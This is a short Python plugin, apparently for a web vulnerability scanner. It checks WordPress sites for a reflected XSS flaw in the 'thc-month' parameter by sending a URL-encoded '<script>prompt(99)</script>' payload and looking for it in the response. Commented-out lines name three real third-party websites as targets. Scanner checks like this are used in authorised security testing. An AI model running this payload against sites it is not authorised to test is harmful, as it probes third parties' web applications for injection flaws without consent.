#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'tardy'
##desc  "thc-month" do not sanitize input data,


def assign(service, arg):
    if service == "wordpress":
        return True, arg


def audit(arg):
    payload = "thc-month=201504%27%22%3E%3Cscript%3Eprompt%2899%29%3C/script%3E"
    verify_url = arg + payload
    code, head, res, _, _ = curl.curl('%s' % (verify_url))
    #code, head, res, _, _ = curl.curl('-d %s %s' % (payload, verify_url))
    if code == 200 and '<script>prompt(99)</script>' in res:
        security_info(verify_url+"thc-month Reflected XSS")

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])
    #audit(assign('wordpress', 'http://dimensaonet.com.br/blog/eco-dimensao-workshop-inscricao/?')[1])
    #audit(assign('wordpress', 'http://sabreschool.com/?post_type=thc-events&date=2015-04-04&country=GB&')[1])
    #audit(assign('wordpress', 'http://zehaschmidtke.de/wp/events/?date=2015-05-25&dateFormat=2&country=DE&readmore=1&')[1])